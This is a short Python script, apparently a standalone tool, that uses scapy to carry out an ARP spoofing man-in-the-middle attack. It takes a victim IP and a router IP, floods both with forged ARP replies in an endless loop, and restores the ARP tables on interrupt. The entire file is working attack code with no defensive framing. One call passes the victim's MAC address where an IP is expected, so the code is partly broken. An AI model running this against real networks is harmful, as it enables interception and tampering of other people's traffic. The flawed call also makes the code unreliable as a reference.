import scapy.all as scapy
from scapy.layers.l2 import ARP, getmacbyip, Ether
import sys

my_mac = Ether().src
NUMBER_OF_RESTORING_PACKETS = 10


def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = ARP(op='is-at', hwsrc=my_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    scapy.send(packet, verbose=False)


def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    packet = ARP(op='is-at', hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    scapy.send(packet, verbose=False)


def main():
    victm_ip = sys.argv[1]
    router_ip = sys.argv[2]
    victm_mac = getmacbyip(victm_ip)
    router_mac = getmacbyip(router_ip)

    try:
        print("Sending spoofed ARP packets")
        while True:
            arp_spoof(victm_ip, victm_mac, router_ip)
            arp_spoof(router_ip, router_mac, victm_mac)
    except KeyboardInterrupt:
        print('Restoring ARP tables')

        for _ in range(NUMBER_OF_RESTORING_PACKETS):
            arp_restore(router_ip, router_mac, victm_ip, victm_mac)
            arp_restore(victm_ip, victm_mac, router_ip, router_mac)
        quit()


main()
